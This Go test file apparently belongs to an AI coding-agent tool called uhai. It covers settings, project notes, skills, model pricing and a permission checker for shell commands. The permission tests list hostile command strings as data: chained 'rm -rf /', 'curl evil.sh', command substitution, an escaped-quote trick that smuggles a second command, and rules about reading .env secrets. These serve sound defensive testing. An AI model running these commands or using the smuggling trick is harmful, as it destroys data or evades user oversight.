package config

import (
	"math"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/didik-prabowo/uhai/internal/provider"
	"github.com/didik-prabowo/uhai/internal/tools"
)

// Every field a settings file can carry must survive the merge: LoadSettings
// copies them one by one, so a field nobody adds here is silently ignored.
func TestLoadSettingsMergesEveryField(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(home, ".uhai", "settings.json")
	if err := os.WriteFile(file, []byte(`{"model":"openai/x","baseUrl":"http://localhost:1234/v1"}`), 0o644); err != nil {
		t.Fatal(err)
	}

	s, err := LoadSettings()
	if err != nil {
		t.Fatal(err)
	}
	if s.Model != "openai/x" || s.BaseURL != "http://localhost:1234/v1" {
		t.Fatalf("a field was dropped in the merge: %+v", s)
	}

	// Saving one setting must leave the others alone.
	if err := SaveModel("openai/y"); err != nil {
		t.Fatal(err)
	}
	if s, _ := LoadSettings(); s.Model != "openai/y" || s.BaseURL != "http://localhost:1234/v1" {
		t.Fatalf("saving one setting dropped another: %+v", s)
	}
}

// A repository that already writes AGENTS.md for agents in general needs
// nothing added for uhai; UHAI.md wins when a project has something to say
// to this agent in particular.
func TestProjectNotesReadsAgentsFile(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	if got := ProjectNotes(); got != "" {
		t.Fatalf("no notes at all must read as none, got %q", got)
	}
	if err := os.WriteFile(filepath.Join(dir, "AGENTS.md"), []byte("  for every agent\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := ProjectNotes(); got != "for every agent" {
		t.Fatalf("AGENTS.md must be read, got %q", got)
	}
	if err := os.WriteFile(filepath.Join(dir, "UHAI.md"), []byte("for uhai\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := ProjectNotes(); got != "for uhai" {
		t.Fatalf("UHAI.md must win, got %q", got)
	}
}

// The registry answers for a family, not for one release, and the answer for
// something it has never heard of has to be safe rather than optimistic.
func TestModelLimits(t *testing.T) {
	for setting, want := range map[string]modelInfo{
		"anthropic/claude-opus-5":   {Context: 1_000_000, MaxOutput: 128_000, InputUSD: 5, OutputUSD: 25, Thinking: true, Effort: "xhigh"},
		"anthropic/claude-sonnet-5": {Context: 1_000_000, MaxOutput: 128_000, InputUSD: 3, OutputUSD: 15, Thinking: true, Effort: "xhigh"},
		// Anything older or unrecognised lands on the claude- fallback, which
		// stays at the figures that are safe everywhere.
		"anthropic/claude-3-5-sonnet-20241022": {Context: 200_000, MaxOutput: 8_192},
		"openai/gpt-4o-mini":                   {Context: 128_000, MaxOutput: 16_384, InputUSD: 0.15, OutputUSD: 0.60, CacheReadUSD: 0.075},
		"gemini/gemini-2.5-flash":              {Context: 1_000_000, MaxOutput: 8_192, Retired: true},
		// Anthropic reports all four itself. Haiku is the one in the family that
		// did not move to a million, and the 4.5 releases answer shorter than
		// the families they belong to — asking Opus 4.5 for its family's 128k
		// output is a request the API refuses.
		"anthropic/claude-haiku-4-5-20251001":  {Context: 200_000, MaxOutput: 64_000, InputUSD: 1, OutputUSD: 5},
		"anthropic/claude-opus-4-5-20251101":   {Context: 200_000, MaxOutput: 64_000, InputUSD: 5, OutputUSD: 25},
		"anthropic/claude-sonnet-4-5-20250929": {Context: 1_000_000, MaxOutput: 64_000, InputUSD: 3, OutputUSD: 15},
		"anthropic/claude-opus-4-8":            {Context: 1_000_000, MaxOutput: 128_000, InputUSD: 5, OutputUSD: 25, Thinking: true, Effort: "xhigh"},
		"gemini/gemini-3.5-flash":              {Context: 1_000_000, MaxOutput: 65_536},
		"gw/qwen2.5-coder":                     {Context: 32_768, MaxOutput: 4_096},
		"gw/meta-llama/llama-3.3-70b-instruct": {Context: 128_000, MaxOutput: 8_192},
		// A gateway serving GLM gets the window and no price: nobody here
		// knows what that gateway charges.
		"gw/glm-4.7":                           {Context: 128_000, MaxOutput: 8_192},
		"gw/glm-4.6":                           {Context: 200_000, MaxOutput: 8_192},
		"gw/glm-4.5-air":                       {Context: 128_000, MaxOutput: 8_192},
		"gw/amazon/nova-lite-v1":               {Context: defaultContext, MaxOutput: defaultMaxOutput},
		"openai/something-nobody-has-heard-of": {Context: defaultContext, MaxOutput: defaultMaxOutput},
	} {
		if got := infoFor(setting); got != want {
			t.Errorf("%s: got %+v, want %+v", setting, got, want)
		}
	}

	// A model name carrying slashes is matched on its last segment, which is
	// where the family lives.
	if ContextWindow("openrouter/anthropic/claude-sonnet-5") != 1_000_000 {
		t.Error("a prefixed model name must still find its family")
	}
}

// Pricing and capabilities are shown, so they have to read the way they are
// quoted — and stay quiet when the host, not the model, sets the price.
func TestModelSummaryAndCost(t *testing.T) {
	if got := ModelSummary("anthropic/claude-sonnet-5"); got != "1M context · $3/$15 per Mtok" {
		t.Fatalf("claude summary = %q", got)
	}
	if got := ModelSummary("openai/gpt-4o-mini"); got != "128k context · $0.15/$0.6 per Mtok" {
		t.Fatalf("gpt-4o-mini summary = %q", got)
	}
	// An open model is hosted by everyone at a different price, so it carries
	// none, and a model nobody has heard of says only what is safe to assume.
	if got := ModelSummary("gw/llama-3.3-70b-versatile"); got != "128k context" {
		t.Fatalf("llama summary = %q", got)
	}
	if got := ModelSummary("gw/amazon/nova-lite-v1"); got != "32k context" {
		t.Fatalf("unknown summary = %q", got)
	}

	if got := CostUSD("anthropic/claude-sonnet-5", provider.Usage{Input: 1_000_000, Output: 100_000}); got != "$4.50" {
		t.Fatalf("a priced turn = %q", got)
	}
	// A cached prefix is not billed like fresh input: reading it back costs a
	// tenth. Pricing it as input would overstate a cached turn by roughly the
	// whole system prompt, which is the larger half of every request.
	fresh := CostUSD("anthropic/claude-sonnet-5", provider.Usage{Input: 1_000_000})
	cached := CostUSD("anthropic/claude-sonnet-5", provider.Usage{CacheRead: 1_000_000})
	if fresh != "$3.00" || cached != "$0.30" {
		t.Fatalf("cached input must cost a tenth: fresh %s, cached %s", fresh, cached)
	}
	if got := CostUSD("anthropic/claude-sonnet-5", provider.Usage{Input: 200, Output: 100}); got != "<$0.01" {
		t.Fatalf("a cheap turn = %q", got)
	}
	if got := CostUSD("gw/llama-3.3-70b-versatile", provider.Usage{Input: 1_000_000, Output: 100_000}); got != "" {
		t.Fatalf("an unpriced model must stay quiet, got %q", got)
	}

	if !SupportsTools("gw/amazon/nova-lite-v1") {
		t.Error("an unknown model must be assumed to manage tools")
	}
}

// A provider uhai has no endpoint for is a gateway, and a gateway's price is
// not the vendor's. "cc/claude-opus-5" matched the prefix claude-opus and was
// billed Anthropic's $5/$25 for turns that were drawn from a subscription's
// window and cost nothing at all.
func TestAGatewayIsSizedButNotPriced(t *testing.T) {
	const gateway = "cc/claude-opus-5"

	// Sized, because something has to decide when to compact and the family
	// figure is the best guess available.
	if got := ContextWindow(gateway); got != 1_000_000 {
		t.Errorf("context = %d, want the family's 1000000", got)
	}
	if got := MaxOutput(gateway); got != 128_000 {
		t.Errorf("max output = %d, want the family's 128000", got)
	}

	// Not priced, in either of the two places a price is shown.
	if got := ModelSummary(gateway); got != "1M context" {
		t.Errorf("summary = %q, want no price in it", got)
	}
	if got := CostUSD(gateway, provider.Usage{Input: 1_000_000, Output: 100_000}); got != "" {
		t.Errorf("a gateway turn priced itself at %q", got)
	}

	// And the same model under the provider that actually sells it is
	// untouched, which is the whole point of keying on the provider.
	if got := CostUSD("anthropic/claude-opus-5", provider.Usage{Input: 1_000_000}); got != "$5.00" {
		t.Errorf("anthropic's own price = %q, want $5.00", got)
	}
}

// What may run without asking is the project's business, and a project adds
// to the home settings rather than replacing them.
// Permission is the setting the tools page documents: allow, ask, deny, and a
// default for anything unnamed.
// Patterns are matched against the whole command line, and the longest one
// wins — otherwise "git *" and "git push *" would depend on map order, which
// is to say on luck.
// The shorthand list keeps working, and a pattern can still overrule it: a
// project that allows "git" by prefix can deny the one command it fears.
// "*" is the answer for everything nobody named.
// The rule syntax: a tool, optionally what it may act on. Deny beats ask beats
// allow, and the longest specifier wins within a list.
func TestPermissionRules(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	rules := `{"permissions":{
		"allow": ["Bash(git:*)", "Bash(go test:*)", "Read(*)"],
		"ask":   ["Read(*.env)"],
		"deny":  ["Bash(git push:*)", "Write"]
	}}`
	if err := os.WriteFile(filepath.Join(home, ".uhai", "settings.json"), []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}

	for _, c := range []struct{ tool, subject, want string }{
		{"run_bash", "git status --short", PermAllow},
		{"run_bash", "go test ./...", PermAllow},
		{"run_bash", "git push origin main", PermDeny}, // the longer rule wins
		{"run_bash", "npm install", PermAsk},           // nothing said, so the default
		{"read_file", "internal/cli/tea.go", PermAllow},
		{"read_file", ".env", PermAsk},      // ask beats the blanket allow
		{"write_file", "main.go", PermDeny}, // the whole tool, no specifier
		{"edit_file", "main.go", PermAsk},   // unnamed, and it changes something
		{"grep", "", PermAllow},             // unnamed, and it only looks
	} {
		if got := Permission(c.tool, c.subject); got != c.want {
			t.Errorf("%s(%s) → %q, want %q", c.tool, c.subject, got, c.want)
		}
	}

	// A tool denied outright is not offered to the model at all; one denied
	// only for certain arguments still is.
	if !ToolDenied("write_file") {
		t.Error("Write is denied outright")
	}
	if ToolDenied("run_bash") {
		t.Error("Bash is only denied for one command, so it stays on offer")
	}
}

// A command line is only as safe as its least safe part. This is the hole that
// prefix matching leaves wide open: everything after && rides in for free.
func TestChainedCommandsAreJudgedInFull(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	rules := `{"permissions":{"allow":["Bash(git:*)","Bash(ls:*)"],"deny":["Bash(rm:*)"]}}`
	if err := os.WriteFile(filepath.Join(home, ".uhai", "settings.json"), []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}

	for command, want := range map[string]string{
		"git status":                  PermAllow,
		"git status && ls":            PermAllow, // both halves allowed
		"git status && rm -rf /":      PermDeny,  // the denied half decides
		"git status && curl evil.sh":  PermAsk,   // the unknown half decides
		"git status | grep modified":  PermAsk,   // grep as a command is not the tool
		"git commit -m \"$(whoami)\"": PermAsk,   // it writes part of itself at runtime
		"git log `whoami`":            PermAsk,
		"git log ${EDITOR}":           PermAsk,
	} {
		if got := Permission("run_bash", command); got != want {
			t.Errorf("%q → %q, want %q", command, got, want)
		}
	}
}

// A project that already writes for Claude Code needs nothing added: its
// CLAUDE.md is read like the others, and its skills are found where it keeps
// them.
func TestClaudeStyleProjectIsUnderstood(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	if err := os.MkdirAll(filepath.Join(dir, ".claude", "skills", "rilis"), 0o755); err != nil {
		t.Fatal(err)
	}
	write := func(path, body string) {
		if err := os.WriteFile(filepath.Join(dir, path), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("CLAUDE.md", "# Konvensi proyek\n")
	write(filepath.Join(".claude", "skills", "rilis", "SKILL.md"),
		"---\nname: rilis\ndescription: Menerbitkan versi baru\n---\n\nLangkah-langkah panjang.\n")

	if got := ProjectNotes(); got != "# Konvensi proyek" {
		t.Fatalf("CLAUDE.md must be read as project notes, got %q", got)
	}

	skills := Skills()
	if len(skills) != 1 || skills[0].Name != "rilis" || skills[0].Description != "Menerbitkan versi baru" {
		t.Fatalf("the skill was not read: %+v", skills)
	}
	// The body stays in the file: only the name and the description travel
	// with every prompt.
	notes := SkillNotes()
	if !strings.Contains(notes, "rilis — Menerbitkan versi baru") || strings.Contains(notes, "Langkah-langkah panjang") {
		t.Fatalf("skill notes = %q", notes)
	}

	// UHAI.md still wins, for a project with something to say to this agent
	// in particular.
	write("UHAI.md", "# Khusus uhai\n")
	if got := ProjectNotes(); got != "# Khusus uhai" {
		t.Fatalf("UHAI.md must win, got %q", got)
	}
}

// A personal file wins over the shared one and pulls it in: that is the shape
// projects use — untracked notes for how one person works, importing what the
// team agreed. Neither is in the AGENTS.md standard, both are common.
func TestLocalNotesAndImports(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	write := func(name, body string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("AGENTS.md", "# Aturan tim\n")
	write("CLAUDE.md", "# Catatan lama\n")
	write("AGENTS.local.md", "# Punya saya\n\n@AGENTS.md\n@CLAUDE.md\n\n## Alur saya\nRencanakan dulu.\n")

	notes := ProjectNotes()
	for _, want := range []string{"# Punya saya", "# Aturan tim", "# Catatan lama", "Rencanakan dulu."} {
		if !strings.Contains(notes, want) {
			t.Errorf("the notes must carry %q:\n%s", want, notes)
		}
	}

	// A file that imports itself, directly or in a ring, must not spin.
	write("AGENTS.local.md", "# Mulai\n@ring.md\n")
	write("ring.md", "# Cincin\n@AGENTS.local.md\n")
	notes = ProjectNotes()
	if !strings.Contains(notes, "# Cincin") {
		t.Fatalf("the import must still happen once:\n%s", notes)
	}
	if strings.Count(notes, "# Mulai") != 1 {
		t.Fatalf("and only once:\n%s", notes)
	}

	// An import of something that is not there stays visible rather than
	// leaving a hole nobody notices.
	write("AGENTS.local.md", "# Mulai\n@tidak-ada.md\n")
	if notes := ProjectNotes(); !strings.Contains(notes, "@tidak-ada.md") {
		t.Fatalf("a missing import must stay on the page:\n%s", notes)
	}
}

// A project that keeps its skills somewhere of its own says so, rather than
// moving its files to suit this.
func TestSkillsFromASettingsFolder(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	if err := os.MkdirAll(filepath.Join(dir, "local-docs", "skills", "planning"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "local-docs", "skills", "planning", "SKILL.md"),
		[]byte("---\nname: planning\ndescription: Rencanakan sebelum menulis kode\n---\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".uhai", "settings.json"),
		[]byte(`{"skills":["local-docs/skills"]}`), 0o644); err != nil {
		t.Fatal(err)
	}

	skills := Skills()
	if len(skills) != 1 || skills[0].Name != "planning" {
		t.Fatalf("the named folder must be searched: %+v", skills)
	}
}

// "baseUrl" moves every provider at once, which is wrong for the case that
// wants it: Z.ai's coding plan is the same API and key at another address, and
// aiming the global one at it would redirect the next /model as well.
func TestBaseURLPerProvider(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", dir)
	t.Setenv("UHAI_BASE_URL", "")
	t.Setenv("ZAI_API_KEY", "k")
	t.Setenv("OPENAI_API_KEY", "k")

	if err := os.MkdirAll(filepath.Join(dir, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	settings := `{"model":"zai/glm-4.7","baseUrls":{"zai":"https://api.z.ai/api/coding/paas/v4"}}`
	if err := os.WriteFile(filepath.Join(dir, ".uhai", "settings.json"), []byte(settings), 0o644); err != nil {
		t.Fatal(err)
	}

	s, err := LoadSettings()
	if err != nil {
		t.Fatal(err)
	}
	if got := s.BaseURLs["zai"]; got != "https://api.z.ai/api/coding/paas/v4" {
		t.Fatalf("the override did not load: %q", got)
	}
	// Any other provider keeps the endpoint the table gives it.
	if got := providerURL(s, "openai"); got != providers["openai"].BaseURL {
		t.Fatalf("openai was redirected to %q", got)
	}
	if got := providerURL(s, "zai"); got != s.BaseURLs["zai"] {
		t.Fatalf("zai should use the override, got %q", got)
	}
}

// Skills that belong to the person rather than the repository: kept in
// ~/.uhai/skills or ~/.claude/skills, and carried into every project. The
// project still wins a name, because it is the more specific answer.
func TestPersonalSkillsTravelButProjectWins(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	project := t.TempDir()
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(project); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	write := func(path, content string) {
		t.Helper()
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	frontmatter := func(name, desc string) string {
		return "---\nname: " + name + "\ndescription: " + desc + "\n---\n"
	}

	// One personal skill nothing else claims, and one the project overrides.
	write(filepath.Join(home, ".uhai", "skills", "catatan", "SKILL.md"), frontmatter("catatan", "punya saya"))
	write(filepath.Join(home, ".claude", "skills", "rilis", "SKILL.md"), frontmatter("rilis", "cara saya merilis"))
	write(filepath.Join(project, ".uhai", "skills", "rilis", "SKILL.md"), frontmatter("rilis", "cara proyek ini merilis"))

	found := map[string]string{}
	for _, s := range Skills() {
		found[s.Name] = s.Description
	}
	if found["catatan"] != "punya saya" {
		t.Errorf("a personal skill must travel into any project: %+v", found)
	}
	if found["rilis"] != "cara proyek ini merilis" {
		t.Errorf("the project's own skill must win the name: %+v", found)
	}
}

// A skill costs its line on every request whether it is opened or not, so the
// ones you carry everywhere and want in one project out of ten can be switched
// off. Off is not the same as missing: it stays in the list, and only leaves
// the prompt.
func TestSkillsCanBeSwitchedOff(t *testing.T) {
	dir := isolate(t)
	back, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(back) })

	write := func(path, content string) {
		t.Helper()
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write(filepath.Join(dir, ".uhai", "skills", "rilis", "SKILL.md"),
		"---\nname: rilis\ndescription: dipakai\n---\n")
	write(filepath.Join(dir, ".uhai", "skills", "gaya", "SKILL.md"),
		"---\nname: gaya\ndescription: tidak dipakai di proyek ini\n---\n")
	write(filepath.Join(dir, ".uhai", "settings.json"), `{"skillsOff":["gaya"]}`)

	var off, on int
	for _, s := range Skills() {
		if s.Off {
			off++
		} else {
			on++
		}
	}
	if off != 1 || on != 1 {
		t.Fatalf("one on and one off, got %d on and %d off", on, off)
	}

	// The half that matters: it stops being paid for.
	notes := SkillNotes()
	if !strings.Contains(notes, "rilis") {
		t.Errorf("a skill left on must still reach the prompt:\n%s", notes)
	}
	if strings.Contains(notes, "gaya") {
		t.Errorf("a skill switched off must not reach the prompt at all:\n%s", notes)
	}
}

// The folder's name is a string, not something the compiler checks, so a
// rename survives only if every copy is found. Renaming ouhai to uhai found
// four copies across two packages and survived on a global search rather than
// on design. There is one copy now, and this is what keeps it that way.
func TestTheDirectoryIsNamedInOnePlace(t *testing.T) {
	err := filepath.Walk("..", func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || filepath.Ext(path) != ".go" {
			return err
		}
		if strings.HasSuffix(path, "_test.go") || filepath.Base(path) == "dir.go" {
			return nil // the tests may say it, and dir.go is where it is said
		}
		source, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		if strings.Contains(string(source), `".uhai"`) || strings.Contains(string(source), `".uhai/`) {
			t.Errorf("%s names the directory itself; use config.Dir, config.InDir or config.ProjectDir", path)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
}

// A permission rule names a tool through toolNames. A tool missing from that
// map cannot be named in a rule at all: parseRule does not recognise it, the
// rule is dropped, and "deny" quietly protects nothing. The failure is silent
// in the worst direction — you believe a tool is denied and it is not.
func TestEveryToolCanBeNamedInARule(t *testing.T) {
	for _, spec := range tools.Definitions() {
		if _, ok := toolName(spec.Name); !ok {
			t.Errorf("%s cannot be named in a permission rule", spec.Name)
		}
	}
	// The agent's own tool is not in Definitions and has to be named too.
	if _, ok := toolName(tools.NameSpawnTask); !ok {
		t.Error("spawn_task cannot be named in a permission rule")
	}
	// The friendly spellings still resolve, and a typo still does not.
	if got, _ := toolName("Bash"); got != tools.NameBash {
		t.Errorf("Bash must resolve to %s, got %s", tools.NameBash, got)
	}
	if _, ok := toolName("bosh"); ok {
		t.Error("a tool nobody has is a typo, not a rule")
	}
}

// One ratio for every vendor was Anthropic's tenth applied to everyone.
// OpenAI's discount is not a tenth and is not even one number: half for 4o,
// a quarter for 4.1.
func TestCachedTokensArePricedPerModel(t *testing.T) {
	million := provider.Usage{CacheRead: 1_000_000}

	// gpt-4o-mini caches at half its input price, not a tenth.
	if got := CostOf("openai/gpt-4o-mini", million); got != 0.075 {
		t.Errorf("gpt-4o-mini cached million = %v, want 0.075", got)
	}
	// Anthropic has no figure of its own and falls back to the tenth, which
	// is where the tenth came from.
	if got := CostOf("anthropic/claude-sonnet-5", million); math.Abs(got-0.3) > 1e-9 {
		t.Errorf("sonnet cached million = %v, want 0.3 (a tenth of $3)", got)
	}
	// Fresh input is untouched by any of this.
	if got := CostOf("openai/gpt-4o-mini", provider.Usage{Input: 1_000_000}); got != 0.15 {
		t.Errorf("fresh input million = %v, want 0.15", got)
	}
}

// A gateway may put its own tag in front of the model's name. 9router answered
// a turn as "openrouter/dpe-glm-5.2" — glm-5.2 with two letters ahead of it —
// and the prefix match gave it the 32k default, so a conversation with a 128k
// window was being summarised away every 27k tokens with nothing on screen
// saying why.
func TestAFamilyIsFoundInsideAGatewaysOwnName(t *testing.T) {
	if got := ContextWindow("openrouter/dpe-glm-5.2"); got != 128_000 {
		t.Errorf("dpe-glm-5.2 is a glm, got a %d window", got)
	}
	if got := ContextWindow("cc/anthropic-claude-opus-5"); got != 1_000_000 {
		t.Errorf("a tagged claude is still a claude, got a %d window", got)
	}

	// And it must not turn a gateway into a model uhai can price. Only family
	// keys are searched for, and a family key is never Known.
	if KnownModel("openrouter/dpe-glm-5.2") {
		t.Error("a family found inside a name is not the model itself")
	}
	if got := ModelSummary("openrouter/dpe-glm-5.2"); strings.Contains(got, "$") {
		t.Errorf("a gateway may never be priced: %q", got)
	}

	// An exact match still wins: the loose pass only runs when nothing was
	// found from the front.
	if got := ContextWindow("anthropic/claude-opus-4-5"); got != 200_000 {
		t.Errorf("a model with its own entry keeps it, got %d", got)
	}
}

// The rules can only judge what they can read, and a bare `$NAME` is not
// readable. `$(...)`, backticks and `${...}` were all treated as such and
// `$HOME` was not, so the same expansion asked or did not depending on whether
// it was written with braces.
func TestAVariableIsNotAllowedSilently(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	rules := `{"permissions":{"allow":["Bash(rm:*)","Bash(echo:*)","Bash(go:*)","Bash(awk:*)","Bash(grep:*)"]}}`
	if err := os.WriteFile(filepath.Join(home, ".uhai", "settings.json"), []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}

	for command, want := range map[string]string{
		"rm -rf ./build":         PermAllow, // readable, and allowed
		"rm -rf $HOME/build":     PermAsk,   // the gap: same expansion as ${HOME}
		"rm -rf ${HOME}/build":   PermAsk,
		"rm -rf $(pwd)/build":    PermAsk,
		"echo \"total: $count\"": PermAsk,

		// Not expansions, and too ordinary to spend a confirmation on: `bash -c`
		// gets no positional arguments, and `$` before a quote is an anchor.
		"awk '{print $1}' f": PermAllow,
		"grep 'needle$' f":   PermAllow,
		"echo done":          PermAllow,
	} {
		if got := Permission("run_bash", command); got != want {
			t.Errorf("%q → %q, want %q", command, got, want)
		}
	}
}

// An operator inside quotes is text, and one behind a backslash is a character.
// The regexp this replaced split on both, which produced parts that were not
// commands — harmless, since more parts only makes the answer stricter, but it
// meant `echo "a && b"` was judged as two fictions.
//
// Reading quotes is what introduces the risk, and the last two rows are where
// it lives: a parse that believes it is inside a quote when bash is not would
// miss a separator, which is the one direction that loses safety rather than
// convenience.
func TestOperatorsAreOnlySeparatorsOutsideQuotes(t *testing.T) {
	for command, want := range map[string][]string{
		`echo "a && b"`:        {`echo "a && b"`},
		`echo 'a; b'`:          {`echo 'a; b'`},
		`go build 2>&1 | head`: {`go build 2>&1`, `head`},
		`git status && ls`:     {`git status`, `ls`},
		`a || b`:               {`a`, `b`},
		`a; b`:                 {`a`, `b`},
		`echo \" && rm -rf /`:  {`echo \"`, `rm -rf /`},
	} {
		got := splitCommand(command)
		if len(got) != len(want) {
			t.Errorf("%q → %d parts %q, want %d", command, len(got), got, len(want))
			continue
		}
		for i := range want {
			if got[i] != want[i] {
				t.Errorf("%q part %d → %q, want %q", command, i, got[i], want[i])
			}
		}
	}
}

// This guards the new parser rather than fixing an old fault: the regexp
// ignored quotes, so it could never be fooled by one. Reading them buys the
// possibility, and the backslash branch is what closes it — without that
// branch this line is one command to us and two to bash, and the `rm` rides in
// on echo's rule.
func TestAnEscapedQuoteDoesNotHideTheRestOfTheLine(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	rules := `{"permissions":{"allow":["Bash(echo:*)"],"deny":["Bash(rm:*)"]}}`
	if err := os.WriteFile(filepath.Join(home, ".uhai", "settings.json"), []byte(rules), 0o644); err != nil {
		t.Fatal(err)
	}

	if got := Permission("run_bash", `echo \" && rm -rf /`); got != PermDeny {
		t.Errorf("an escaped quote hid the rm: got %q, want %q", got, PermDeny)
	}
}

// An explicit rule is checked before the default, so somebody who means it can
// still read their own .env without editing the code.
func TestAnExplicitRuleBeatsTheCredentialDefault(t *testing.T) {
	home := isolate(t)
	if err := os.MkdirAll(filepath.Join(home, ".uhai"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, ".uhai", "settings.json"),
		[]byte(`{"permissions":{"allow":["Read(./.env)"]}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	if got := Permission("read_file", ".env"); got != PermAllow {
		t.Errorf("an explicit allow must win: got %q", got)
	}
	if got := Permission("read_file", "other/.env"); got != PermDeny {
		t.Errorf("the rule named one path, not the category: got %q", got)
	}
}
